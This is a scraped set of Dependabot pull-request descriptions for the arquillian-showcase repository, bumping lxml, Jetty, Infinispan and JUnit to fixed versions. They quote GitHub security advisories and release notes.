[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=lxml&package-manager=pip&previous-version=4.5.0&new-version=4.6.3)](https://dependabot.com/compatibility-score/?dependency-name=lxml&package-manager=pip&previous-version=4.5.0&new-version=4.6.3)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language
- `@dependabot badge me` will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme

Additionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):
- Update frequency (including time of day and day of week)
- Pull request limits (per update run and/or open at any time)
- Out-of-range updates (receive only lockfile updates, if desired)
- Security updates (receive only security updates, if desired)



</details>",,yes,"dependencies,security,"
arquillian/arquillian-showcase,940668738,"[Security] Bump version.jetty from 8.0.0.M3 to 11.0.6","Bumps `version.jetty` from 8.0.0.M3 to 11.0.6.
Updates `jetty-webapp` from 8.0.0.M3 to 11.0.6 **This update includes a security fix.**
<details>
<summary>Vulnerabilities fixed</summary>
<p><em>Sourced from <a href=""https://github.com/advisories/GHSA-g3wg-6mcf-8jj6"">The GitHub Security Advisory Database</a>.</em></p>
<blockquote>
<p><strong>Local Temp Directory Hijacking Vulnerability</strong></p>
<h3>Impact</h3>
<p>On Unix like systems, the system's temporary directory is shared between all users on that system.  A collocated user can observe the process of creating a temporary sub directory in the shared temporary directory and race to complete the creation of the temporary subdirectory.  If the attacker wins the race then they will have read and write permission to the subdirectory used to unpack web applications, including their WEB-INF/lib jar files and JSP files.  If any code is ever executed out of this temporary directory, this can lead to a local privilege escalation vulnerability.</p>
<p>Additionally, any user code uses of <a href=""https://www.eclipse.org/jetty/javadoc/9.4.31.v20200723/org/eclipse/jetty/webapp/WebAppContext.html#getTempDirectory()"">WebAppContext::getTempDirectory</a> would similarly be vulnerable.</p>
<p>Additionally, any user application code using the <code>ServletContext</code> attribute for the tempdir will also be impacted.
See: <a href=""https://javaee.github.io/javaee-spec/javadocs/javax/servlet/ServletContext.html#TEMPDIR"">https://javaee.github.io/javaee-spec/javadocs/javax/servlet/ServletContext.html#TEMPDIR</a></p>
<p>For example:</p>
<pre lang=""java""><code>import java.io.File;
import java.io.IOException;
import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
<p>public class ExampleServlet extends HttpServlet {
<a href=""https://github.com/Override""><code>@​Override</code></a>
&lt;/tr&gt;&lt;/table&gt;
</code></pre></p>
</blockquote>
<p>... (truncated)</p>
<blockquote>
<p>Affected versions: &lt; 9.4.33</p>
</blockquote>
</details>
<details>
<summary>Release notes</summary>
<p><em>Sourced from <a href=""https://github.com/eclipse/jetty.project/releases"">jetty-webapp's releases</a>.</em></p>
<blockquote>
<h2>11.0.6</h2>
<h1>Changelog</h1>
<ul>
<li><a href=""https://github-redirect.dependabot.com/eclipse/jetty.project/issues/6473"">#6473</a> - Improve alias checking in PathResource</li>
<li><a href=""https://github-redirect.dependabot.com/eclipse/jetty.project/issues/6468"">#6468</a> - Revert logic in Request.setMetaData &amp; clear emptySegment on HttpUri.clear()</li>
<li><a href=""https://github-redirect.dependabot.com/eclipse/jetty.project/issues/6464"">#6464</a> - Wrong files/lib definitions in certain *-capture.mod files?</li>
<li><a href=""https://github-redirect.dependabot.com/eclipse/jetty.project/issues/6447"">#6447</a> - Deprecate support for UTF16 encoding in URIs</li>
<li><a href=""https://github-redirect.dependabot.com/eclipse/jetty.project/issues/6426"">#6426</a> - Update to spifly 1.3.3</li>
<li><a href=""https://github-redirect.dependabot.com/eclipse/jetty.project/issues/6425"">#6425</a> - Update to asm 9.1</li>
<li><a href=""https://github-redirect.dependabot.com/eclipse/jetty.project/issues/6418"">#6418</a> - Bad and/or missing Require-Capability for osgi.serviceloader</li>
<li><a href=""https://github-redirect.dependabot.com/eclipse/jetty.project/issues/6410"">#6410</a> - Ensure Jetty IO uses SocketAddress instead of InetSocketAddress</li>
<li><a href=""https://github-redirect.dependabot.com/eclipse/jetty.project/issues/6407"">#6407</a> - Malformed scheme logical expression check in WebSocket ClientUpgradeRequest</li>
<li><a href=""https://github-redirect.dependabot.com/eclipse/jetty.project/issues/6394"">#6394</a> - Review osgi manifests within Jetty 11</li>
<li><a href=""https://github-redirect.dependabot.com/eclipse/jetty.project/issues/6376"">#6376</a> - Cleanups for SslClientCertAuthenticator.</li>
<li><a href=""https://github-redirect.dependabot.com/eclipse/jetty.project/issues/6375"">#6375</a> - Always check XML <code>Set</code> elements with <code>property</code> attribute</li>
<li><a href=""https://github-redirect.dependabot.com/eclipse/jetty.project/issues/6353"">#6353</a> - Rename EWYK The AdaptiveExecutionStrategy</li>
</ul>
<h2>11.0.5</h2>
<h1>Changelog</h1>
<ul>
<li><a href=""https://github-redirect.dependabot.com/eclipse/jetty.project/issues/6392"">#6392</a> - Review accidental xml config changes</li>
<li><a href=""https://github-redirect.dependabot.com/eclipse/jetty.project/issues/6379"">#6379</a> - Reduce contention in all <code>ByteBufferPool</code> implementations</li>
<li><a href=""https://github-redirect.dependabot.com/eclipse/jetty.project/issues/6354"">#6354</a> - org.slfj dependency imports packages at 2.0</li>
<li><a href=""https://github-redirect.dependabot.com/eclipse/jetty.project/issues/6329"">#6329</a> - Regression on graceful shutdown default in Jetty 10</li>
<li><a href=""https://github-redirect.dependabot.com/eclipse/jetty.project/issues/6302"">#6302</a> - Treat empty path segments are ambiguous.</li>
<li><a href=""https://github-redirect.dependabot.com/eclipse/jetty.project/issues/4772"">#4772</a> - Jetty WebSocket API onMessage annotation does not support partial messages.</li>
</ul>
<h2>11.0.4</h2>
<h1>Special Thanks to the following Eclipse Jetty community members</h1>
<ul>
<li><a href=""https://github.com/tjwatson""><code>@​tjwatson</code></a> (Thomas Watson)</li>
</ul>
<h1>Changelog</h1>
<ul>
<li><a href=""https://github-redirect.dependabot.com/eclipse/jetty.project/issues/6354"">#6354</a> - org.slfj dependency imports packages at 2.0 (<a href=""https://github.com/tjwatson""><code>@​tjwatson</code></a>)</li>
<li><a href=""https://github-redirect.dependabot.com/eclipse/jetty.project/issues/6347"">#6347</a> - session-store-gcloud module broken logging dependency</li>
<li><a href=""https://github-redirect.dependabot.com/eclipse/jetty.project/issues/6330"">#6330</a> - CustomRequestLog is missing HTTP version format option</li>
<li><a href=""https://github-redirect.dependabot.com/eclipse/jetty.project/issues/6305"">#6305</a> - Optimise <code>ContextHandler.isProtectedTarget</code></li>
<li><a href=""https://github-redirect.dependabot.com/eclipse/jetty.project/issues/6285"">#6285</a> - HTTP2 client: IllegalStateException: Cannot release an already released entry</li>
<li><a href=""https://github-redirect.dependabot.com/eclipse/jetty.project/issues/6276"">#6276</a> - Support non-standard domains in SNI and X509</li>
<li><a href=""https://github-redirect.dependabot.com/eclipse/jetty.project/issues/6268"">#6268</a> - Warnings about &quot;unable to parse form content&quot; are not helpful for troubleshooting</li>
<li><a href=""https://github-redirect.dependabot.com/eclipse/jetty.project/issues/6118"">#6118</a> - Display a warning when Hazelcast configuration does not contain Jetty session serializer</li>
<li><a href=""https://github-redirect.dependabot.com/eclipse/jetty.project/issues/6114"">#6114</a> - Jetty Deploy scan / symlink behavior is broken</li>
<li><a href=""https://github-redirect.dependabot.com/eclipse/jetty.project/issues/6112"">#6112</a> - Jetty logging service file leaking to web applications</li>
</ul>
<h2>11.0.3</h2>
<h1>Changelog</h1>
<ul>
<li>This release resolves <a href=""https://github.com/eclipse/jetty.project/security/advisories/GHSA-gwcr-j4wh-j3cq"">CVE-2021-28169</a> and <a href=""https://github.com/eclipse/jetty.project/security/advisories/GHSA-m6cp-vxjx-65j6"">CVE-2021-34428</a></li>
<li><a href=""https://github-redirect.dependabot.com/eclipse/jetty.project/issues/3764"">#3764</a> DeprecationWarning Decorator</li>
</ul>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/eclipse/jetty.project/commit/69469432898becda3aed32a32d4b0adbb7b6daee""><code>6946943</code></a> Updating to version 11.0.6</li>
<li><a href=""https://github.com/eclipse/jetty.project/commit/4d2648ae4fe8e02cd7d90ad3dc8011aad5461951""><code>4d2648a</code></a> Merge remote-tracking branch 'origin/jetty-10.0.x' into jetty-11.0.x</li>
<li><a href=""https://github.com/eclipse/jetty.project/commit/c753ca0db547dc44e3979eaee2b897fa0d275406""><code>c753ca0</code></a> <a href=""https://github-redirect.dependabot.com/eclipse/jetty.project/issues/6455"">#6455</a> disable MaxDuration mechanism in testConnectionMaxUsage as it clashes w...</li>
<li><a href=""https://github.com/eclipse/jetty.project/commit/d1aeaf7cfaefc021713983b4a76375699d3c900b""><code>d1aeaf7</code></a> Merge remote-tracking branch 'origin/jetty-10.0.x' into jetty-11.0.x</li>
<li><a href=""https://github.com/eclipse/jetty.project/commit/bc0fbbb5c101ce88deadca004e63b69c94b4ae07""><code>bc0fbbb</code></a> Revert logic in Request.setMetaData, clear emptySegment on HttpUri.clear() (#...</li>
<li><a href=""https://github.com/eclipse/jetty.project/commit/d13bd9b63b8659c5b35803436b3d71cda774c3c9""><code>d13bd9b</code></a> Merge remote-tracking branch 'origin/jetty-10.0.x' into jetty-11.0.x</li>
<li><a href=""https://github.com/eclipse/jetty.project/commit/4673846635e3c3d85c2c327a4e80e1bb3d172745""><code>4673846</code></a> Compliance modes documentation (<a href=""https://github-redirect.dependabot.com/eclipse/jetty.project/issues/6312"">#6312</a>)</li>
<li><a href=""https://github.com/eclipse/jetty.project/commit/c1b6e30471eddc6180cc95d15ca51b201021c014""><code>c1b6e30</code></a> Merge remote-tracking branch 'origin/jetty-10.0.x' into jetty-11.0.x</li>
<li><a href=""https://github.com/eclipse/jetty.project/commit/0b96734bbb13885b7c4529fdecab61bf8d9175f2""><code>0b96734</code></a> Merge pull request <a href=""https://github-redirect.dependabot.com/eclipse/jetty.project/issues/6465"">#6465</a> from eclipse/jetty-10.0.x-6464-log4j1-download-location</li>
<li><a href=""https://github.com/eclipse/jetty.project/commit/d233f3be02e112d4d212c96bc3325a7eade74b06""><code>d233f3b</code></a> Issue <a href=""https://github-redirect.dependabot.com/eclipse/jetty.project/issues/6447"">#6447</a> - Deprecate support for UTF16 encoding in URIs (<a href=""https://github-redirect.dependabot.com/eclipse/jetty.project/issues/6457"">#6457</a>)</li>
<li>Additional commits viewable in <a href=""https://github.com/eclipse/jetty.project/compare/jetty-8.0.0.M3...jetty-11.0.6"">compare view</a></li>
</ul>
</details>
<br />

Updates `jetty-plus` from 8.0.0.M3 to 11.0.6
<details>
<summary>Release notes</summary>
<p><em>Sourced from <a href=""https://github.com/eclipse/jetty.project/releases"">jetty-plus's releases</a>.</em></p>
<blockquote>
<h2>11.0.6</h2>
<h1>Changelog</h1>
<ul>
<li><a href=""https://github-redirect.dependabot.com/eclipse/jetty.project/issues/6473"">#6473</a> - Improve alias checking in PathResource</li>
<li><a href=""https://github-redirect.dependabot.com/eclipse/jetty.project/issues/6468"">#6468</a> - Revert logic in Request.setMetaData &amp; clear emptySegment on HttpUri.clear()</li>
<li><a href=""https://github-redirect.dependabot.com/eclipse/jetty.project/issues/6464"">#6464</a> - Wrong files/lib definitions in certain *-capture.mod files?</li>
<li><a href=""https://github-redirect.dependabot.com/eclipse/jetty.project/issues/6447"">#6447</a> - Deprecate support for UTF16 encoding in URIs</li>
<li><a href=""https://github-redirect.dependabot.com/eclipse/jetty.project/issues/6426"">#6426</a> - Update to spifly 1.3.3</li>
<li><a href=""https://github-redirect.dependabot.com/eclipse/jetty.project/issues/6425"">#6425</a> - Update to asm 9.1</li>
<li><a href=""https://github-redirect.dependabot.com/eclipse/jetty.project/issues/6418"">#6418</a> - Bad and/or missing Require-Capability for osgi.serviceloader</li>
<li><a href=""https://github-redirect.dependabot.com/eclipse/jetty.project/issues/6410"">#6410</a> - Ensure Jetty IO uses SocketAddress instead of InetSocketAddress</li>
<li><a href=""https://github-redirect.dependabot.com/eclipse/jetty.project/issues/6407"">#6407</a> - Malformed scheme logical expression check in WebSocket ClientUpgradeRequest</li>
<li><a href=""https://github-redirect.dependabot.com/eclipse/jetty.project/issues/6394"">#6394</a> - Review osgi manifests within Jetty 11</li>
<li><a href=""https://github-redirect.dependabot.com/eclipse/jetty.project/issues/6376"">#6376</a> - Cleanups for SslClientCertAuthenticator.</li>
<li><a href=""https://github-redirect.dependabot.com/eclipse/jetty.project/issues/6375"">#6375</a> - Always check XML <code>Set</code> elements with <code>property</code> attribute</li>
<li><a href=""https://github-redirect.dependabot.com/eclipse/jetty.project/issues/6353"">#6353</a> - Rename EWYK The AdaptiveExecutionStrategy</li>
</ul>
<h2>11.0.5</h2>
<h1>Changelog</h1>
<ul>
<li><a href=""https://github-redirect.dependabot.com/eclipse/jetty.project/issues/6392"">#6392</a> - Review accidental xml config changes</li>
<li><a href=""https://github-redirect.dependabot.com/eclipse/jetty.project/issues/6379"">#6379</a> - Reduce contention in all <code>ByteBufferPool</code> implementations</li>
<li><a href=""https://github-redirect.dependabot.com/eclipse/jetty.project/issues/6354"">#6354</a> - org.slfj dependency imports packages at 2.0</li>
<li><a href=""https://github-redirect.dependabot.com/eclipse/jetty.project/issues/6329"">#6329</a> - Regression on graceful shutdown default in Jetty 10</li>
<li><a href=""https://github-redirect.dependabot.com/eclipse/jetty.project/issues/6302"">#6302</a> - Treat empty path segments are ambiguous.</li>
<li><a href=""https://github-redirect.dependabot.com/eclipse/jetty.project/issues/4772"">#4772</a> - Jetty WebSocket API onMessage annotation does not support partial messages.</li>
</ul>
<h2>11.0.4</h2>
<h1>Special Thanks to the following Eclipse Jetty community members</h1>
<ul>
<li><a href=""https://github.com/tjwatson""><code>@​tjwatson</code></a> (Thomas Watson)</li>
</ul>
<h1>Changelog</h1>
<ul>
<li><a href=""https://github-redirect.dependabot.com/eclipse/jetty.project/issues/6354"">#6354</a> - org.slfj dependency imports packages at 2.0 (<a href=""https://github.com/tjwatson""><code>@​tjwatson</code></a>)</li>
<li><a href=""https://github-redirect.dependabot.com/eclipse/jetty.project/issues/6347"">#6347</a> - session-store-gcloud module broken logging dependency</li>
<li><a href=""https://github-redirect.dependabot.com/eclipse/jetty.project/issues/6330"">#6330</a> - CustomRequestLog is missing HTTP version format option</li>
<li><a href=""https://github-redirect.dependabot.com/eclipse/jetty.project/issues/6305"">#6305</a> - Optimise <code>ContextHandler.isProtectedTarget</code></li>
<li><a href=""https://github-redirect.dependabot.com/eclipse/jetty.project/issues/6285"">#6285</a> - HTTP2 client: IllegalStateException: Cannot release an already released entry</li>
<li><a href=""https://github-redirect.dependabot.com/eclipse/jetty.project/issues/6276"">#6276</a> - Support non-standard domains in SNI and X509</li>
<li><a href=""https://github-redirect.dependabot.com/eclipse/jetty.project/issues/6268"">#6268</a> - Warnings about &quot;unable to parse form content&quot; are not helpful for troubleshooting</li>
<li><a href=""https://github-redirect.dependabot.com/eclipse/jetty.project/issues/6118"">#6118</a> - Display a warning when Hazelcast configuration does not contain Jetty session serializer</li>
<li><a href=""https://github-redirect.dependabot.com/eclipse/jetty.project/issues/6114"">#6114</a> - Jetty Deploy scan / symlink behavior is broken</li>
<li><a href=""https://github-redirect.dependabot.com/eclipse/jetty.project/issues/6112"">#6112</a> - Jetty logging service file leaking to web applications</li>
</ul>
<h2>11.0.3</h2>
<h1>Changelog</h1>
<ul>
<li>This release resolves <a href=""https://github.com/eclipse/jetty.project/security/advisories/GHSA-gwcr-j4wh-j3cq"">CVE-2021-28169</a> and <a href=""https://github.com/eclipse/jetty.project/security/advisories/GHSA-m6cp-vxjx-65j6"">CVE-2021-34428</a></li>
<li><a href=""https://github-redirect.dependabot.com/eclipse/jetty.project/issues/3764"">#3764</a> DeprecationWarning Decorator</li>
</ul>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/eclipse/jetty.project/commit/69469432898becda3aed32a32d4b0adbb7b6daee""><code>6946943</code></a> Updating to version 11.0.6</li>
<li><a href=""https://github.com/eclipse/jetty.project/commit/4d2648ae4fe8e02cd7d90ad3dc8011aad5461951""><code>4d2648a</code></a> Merge remote-tracking branch 'origin/jetty-10.0.x' into jetty-11.0.x</li>
<li><a href=""https://github.com/eclipse/jetty.project/commit/c753ca0db547dc44e3979eaee2b897fa0d275406""><code>c753ca0</code></a> <a href=""https://github-redirect.dependabot.com/eclipse/jetty.project/issues/6455"">#6455</a> disable MaxDuration mechanism in testConnectionMaxUsage as it clashes w...</li>
<li><a href=""https://github.com/eclipse/jetty.project/commit/d1aeaf7cfaefc021713983b4a76375699d3c900b""><code>d1aeaf7</code></a> Merge remote-tracking branch 'origin/jetty-10.0.x' into jetty-11.0.x</li>
<li><a href=""https://github.com/eclipse/jetty.project/commit/bc0fbbb5c101ce88deadca004e63b69c94b4ae07""><code>bc0fbbb</code></a> Revert logic in Request.setMetaData, clear emptySegment on HttpUri.clear() (#...</li>
<li><a href=""https://github.com/eclipse/jetty.project/commit/d13bd9b63b8659c5b35803436b3d71cda774c3c9""><code>d13bd9b</code></a> Merge remote-tracking branch 'origin/jetty-10.0.x' into jetty-11.0.x</li>
<li><a href=""https://github.com/eclipse/jetty.project/commit/4673846635e3c3d85c2c327a4e80e1bb3d172745""><code>4673846</code></a> Compliance modes documentation (<a href=""https://github-redirect.dependabot.com/eclipse/jetty.project/issues/6312"">#6312</a>)</li>
<li><a href=""https://github.com/eclipse/jetty.project/commit/c1b6e30471eddc6180cc95d15ca51b201021c014""><code>c1b6e30</code></a> Merge remote-tracking branch 'origin/jetty-10.0.x' into jetty-11.0.x</li>
<li><a href=""https://github.com/eclipse/jetty.project/commit/0b96734bbb13885b7c4529fdecab61bf8d9175f2""><code>0b96734</code></a> Merge pull request <a href=""https://github-redirect.dependabot.com/eclipse/jetty.project/issues/6465"">#6465</a> from eclipse/jetty-10.0.x-6464-log4j1-download-location</li>
<li><a href=""https://github.com/eclipse/jetty.project/commit/d233f3be02e112d4d212c96bc3325a7eade74b06""><code>d233f3b</code></a> Issue <a href=""https://github-redirect.dependabot.com/eclipse/jetty.project/issues/6447"">#6447</a> - Deprecate support for UTF16 encoding in URIs (<a href=""https://github-redirect.dependabot.com/eclipse/jetty.project/issues/6457"">#6457</a>)</li>
<li>Additional commits viewable in <a href=""https://github.com/eclipse/jetty.project/compare/jetty-8.0.0.M3...jetty-11.0.6"">compare view</a></li>
</ul>
</details>
<br />


Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language
- `@dependabot badge me` will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme

Additionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):
- Update frequency (including time of day and day of week)
- Pull request limits (per update run and/or open at any time)
- Automerge options (never/patch/minor, and dev/runtime dependencies)
- Out-of-range updates (receive only lockfile updates, if desired)
- Security updates (receive only security updates, if desired)



</details>",,yes,"dependencies,security,"
arquillian/arquillian-showcase,553137045,"[Security] Bump infinispan-core from 5.1.1.FINAL to 10.0.0.Final","Bumps [infinispan-core](https://github.com/infinispan/infinispan) from 5.1.1.FINAL to 10.0.0.Final. **This update includes a security fix.**
<details>
<summary>Vulnerabilities fixed</summary>
<p><em>Sourced from <a href=""https://github.com/advisories/GHSA-6x3v-rw2q-9gx7"">The GitHub Security Advisory Database</a>.</em></p>
<blockquote>
<p><strong>High severity vulnerability that affects org.infinispan:infinispan-core</strong>
A flaw was found in Infinispan through version 9.4.14.Final. An improper implementation of the session fixation protection in the Spring Session integration can result in incorrect session handling.</p>
<p>Affected versions: &lt; 10.0.0</p>
</blockquote>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/infinispan/infinispan/commit/6f58312b9a4cfa7d0ac0a172cd972ba43f0dd7f3""><code>6f58312</code></a> Releasing version 10.0.0.Final</li>
<li><a href=""https://github.com/infinispan/infinispan/commit/c44d755c186c7daee2cd7f5d09611f78b6a950dd""><code>c44d755</code></a> ISPN-10192 Non-blocking cross-site requests</li>
<li><a href=""https://github.com/infinispan/infinispan/commit/b7ba7c9223d486ccdfd4336893eb4cf2465c598a""><code>b7ba7c9</code></a> ISPN-10776 ServerNG tasks and scripting</li>
<li><a href=""https://github.com/infinispan/infinispan/commit/7f95613d7c3c82c002690800cbe3d27600eca614""><code>7f95613</code></a> ISPN-10827 Caches created through the admin api should be PERMANENT by default</li>
<li><a href=""https://github.com/infinispan/infinispan/commit/834d95fd65ce4b531eafa53b28aa389814b2b4c8""><code>834d95f</code></a> ISPN-10575 Replace TEST_PING with LOCAL_PING</li>
<li><a href=""https://github.com/infinispan/infinispan/commit/aca8f8ad920b1cac7d1869274f455986ec163502""><code>aca8f8a</code></a> ISPN-10821 Decrease GMS join_timeout and increase xPING num_discovery_runs</li>
<li><a href=""https://github.com/infinispan/infinispan/commit/ff67485a895607aaab0d5a7e3f64cdb44542e4bc""><code>ff67485</code></a> ISPN-10820 Upgrade to JGroups 4.1.6.Final</li>
<li><a href=""https://github.com/infinispan/infinispan/commit/c613b2dfb21fba956232dab4abdfd6629e3a39a0""><code>c613b2d</code></a> ISPN-9083 Remove support for 'indexed_by_default' option in protobuf schemas</li>
<li><a href=""https://github.com/infinispan/infinispan/commit/870ff2441deb64b07cb5e76f924a275dbdc86d7a""><code>870ff24</code></a> ISPN-9322 Remove support for long time deprecated IndexedField in proto schemas</li>
<li><a href=""https://github.com/infinispan/infinispan/commit/585277229d91697a99d797e4c810a65b026b64a6""><code>5852772</code></a> Give more general names to params of SecurityActions.addCacheDependency</li>
<li>Additional commits viewable in <a href=""https://github.com/infinispan/infinispan/compare/5.1.1.FINAL...10.0.0.Final"">compare view</a></li>
</ul>
</details>
<br />


[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=org.infinispan:infinispan-core&package-manager=maven&previous-version=5.1.1.FINAL&new-version=10.0.0.Final)](https://dependabot.com/compatibility-score.html?dependency-name=org.infinispan:infinispan-core&package-manager=maven&previous-version=5.1.1.FINAL&new-version=10.0.0.Final)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language
- `@dependabot badge me` will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme

Additionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):
- Update frequency (including time of day and day of week)
- Pull request limits (per update run and/or open at any time)
- Automerge options (never/patch/minor, and dev/runtime dependencies)
- Out-of-range updates (receive only lockfile updates, if desired)
- Security updates (receive only security updates, if desired)



</details>",,yes,"dependencies,security,"
arquillian/arquillian-showcase,719550476,"[Security] Bump junit from 4.8.1 to 4.13.1","Bumps [junit](https://github.com/junit-team/junit4) from 4.8.1 to 4.13.1. **This update includes a security fix.**
<details>
<summary>Vulnerabilities fixed</summary>
<p><em>Sourced from <a href=""https://github.com/advisories/GHSA-269g-pwp5-87pp"">The GitHub Security Advisory Database</a>.</em></p>
<blockquote>
<p><strong>TemporaryFolder on unix-like systems does not limit access to created files</strong></p>
<h3>Vulnerability</h3>
<p>The JUnit4 test rule <a href=""https://junit.org/junit4/javadoc/4.13/org/junit/rules/TemporaryFolder.html"">TemporaryFolder</a> contains a local information disclosure vulnerability.</p>
<p>Example of vulnerable code:</p>
<pre lang=""java""><code>public static class HasTempFolder {
    @Rule
    public TemporaryFolder folder = new TemporaryFolder();
<pre><code>@Test
public void testUsingTempFolder() throws IOException {
    folder.getRoot(); // Previous file permissions: `drwxr-xr-x`; After fix:`drwx------`
    File createdFile= folder.newFile(&amp;quot;myfile.txt&amp;quot;); // unchanged/irrelevant file permissions
    File createdFolder= folder.newFolder(&amp;quot;subfolder&amp;quot;); // unchanged/irrelevant file permissions
    // ...
}
</code></pre>
<p>}
</code></pre></p>
<!-- raw HTML omitted -->
<p>Affected versions: &lt; 4.13.1</p>
</blockquote>
</details>
<details>
<summary>Release notes</summary>
<p><em>Sourced from <a href=""https://github.com/junit-team/junit4/releases"">junit's releases</a>.</em></p>
<blockquote>
<h2>JUnit 4.13.1</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit/blob/HEAD/doc/ReleaseNotes4.13.1.md"">release notes</a> for details.</p>
<h2>JUnit 4.13</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit/blob/HEAD/doc/ReleaseNotes4.13.md"">release notes</a> for details.</p>
<h2>JUnit 4.13 RC 2</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit4/wiki/4.13-Release-Notes"">release notes</a> for details.</p>
<h2>JUnit 4.13 RC 1</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit4/wiki/4.13-Release-Notes"">release notes</a> for details.</p>
<h2>JUnit 4.13 Beta 3</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit4/wiki/4.13-Release-Notes"">release notes</a> for details.</p>
<h2>JUnit 4.13 Beta 2</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit4/wiki/4.13-Release-Notes"">release notes</a> for details.</p>
<h2>JUnit 4.13 Beta 1</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit4/wiki/4.13-Release-Notes"">release notes</a> for details.</p>
<h2>JUnit 4.12</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit/blob/HEAD/doc/ReleaseNotes4.12.md"">release notes</a> for details.</p>
<h2>JUnit 4.12 Beta 3</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit/blob/HEAD/doc/ReleaseNotes4.12.md"">release notes</a> for details.</p>
<h2>JUnit 4.12 Beta 2</h2>
<p>No release notes provided.</p>
<h2>JUnit 4.12 Beta 1</h2>
<p>No release notes provided.</p>
<h2>JUnit 4.11</h2>
<p>No release notes provided.</p>
</blockquote>
</details>
<details>
<summary>Changelog</summary>
<p><em>Sourced from <a href=""https://github.com/junit-team/junit4/blob/main/doc/ReleaseNotes4.13.1.md"">junit's changelog</a>.</em></p>
<blockquote>
<h2>Summary of changes in version 4.13.1</h2>
<h1>Rules</h1>
